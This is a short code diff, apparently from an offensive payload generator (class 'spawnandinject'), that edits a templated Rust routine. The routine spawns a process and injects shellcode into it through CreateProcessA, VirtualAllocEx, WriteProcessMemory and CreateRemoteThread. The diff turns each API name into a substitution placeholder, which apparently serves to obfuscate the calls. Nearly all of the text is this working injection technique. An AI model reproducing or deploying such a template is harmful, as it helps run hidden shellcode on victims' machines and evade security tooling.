@@ -50,7 +50,7 @@ class spawnandinject:
         let mut lpprocessinformation = PROCESS_INFORMATION::default();
 
 
-        let _ = CreateProcessA(
+        let _ = {CreateProcessA}(
             ptr::null_mut(),
             name.as_ptr() as *mut u8, 
             ptr::null_mut(), 
@@ -65,21 +65,21 @@ class spawnandinject:
         
         let lpbuffer: *mut c_void = std::mem::transmute(shellcode.as_ptr());
         
-        let addr = VirtualAllocEx(
+        let addr = {VirtualAllocEx}(
             (lpprocessinformation).hProcess, 
             std::ptr::null(), 
             shellcode.len() as usize, 
             MEM_COMMIT | MEM_RESERVE, 
             $memoryPermission);
 
-        let _ = WriteProcessMemory(
+        let _ = {WriteProcessMemory}(
             (lpprocessinformation).hProcess, 
             addr, 
             lpbuffer, 
             shellcode.len() as usize, 
             ptr::null_mut());
 
-        let thread = CreateRemoteThread(
+        let thread = {CreateRemoteThread}(
             (lpprocessinformation).hProcess, 
             ptr::null_mut(), 
             0, 
@@ -88,7 +88,7 @@ class spawnandinject:
             0,
             ptr::null_mut());
             
-        WaitForSingleObject(thread, 500);
+        {WaitForSingleObject}(thread, 500);
     
     }}
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
